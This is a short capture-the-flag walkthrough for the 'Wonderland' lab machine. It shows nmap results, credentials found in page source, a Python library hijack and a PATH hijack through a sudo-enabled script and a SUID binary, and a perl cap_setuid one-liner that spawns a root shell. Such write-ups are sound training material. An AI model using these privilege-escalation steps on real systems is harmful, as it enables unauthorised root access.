# Wonderland

## nmap

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8e:ee:fb:96:ce:ad:70:dd:05:a9:3b:0d:b0:71:b8:63 (RSA)
|   256 7a:92:79:44:16:4f:20:43:50:a9:a8:47:e2:c2:be:84 (ECDSA)
|_  256 00:0b:80:44:e6:3d:4b:69:47:92:2c:55:14:7e:2a:c9 (ED25519)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Follow the white rabbit.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Dec  5 06:27:31 2021 -- 1 IP address (1 host up) scanned in 20.27 seconds

```


## Enumeration

![](https://i.imgur.com/mcrta85.png)

- Found /r/a/b/b/i/t directory
- stego just gave us hints to follow the r a b b i t
- Viewing source code on that directory gave us creds

![](https://i.imgur.com/VUJ9fyn.png)

- `alice:HowDothTheLittleCrocodileImproveHisShiningTail`

## Foothold
- Ssh into box with those creds and it works
- Run sudo -l and we can see that we can run python and the script as the user rabbit
- create random.py 
```python
import os
os.system("/bin/bash")
```
- Run the script `sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py`

- We now have shell as user rabbit
- Navigate to /home/rabbit and we see a teaParty

- Realize that teaParty script runs the bash command `date`
- Create a date script in our directory that runs `/bin/bash`
- Export our current working directory into our PATH with `bash
export PATH=/tmp:$PATH`
- Run the teaParty binary
- We are hatter, cat out hatter's password: WhyIsARavenLikeAWritingDesk?

## Priv Esc
- Run linpeas, discover that /usr/bin/perl has the `cap_setuid` capability
- GTFO bin it `
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'`
- We are root 


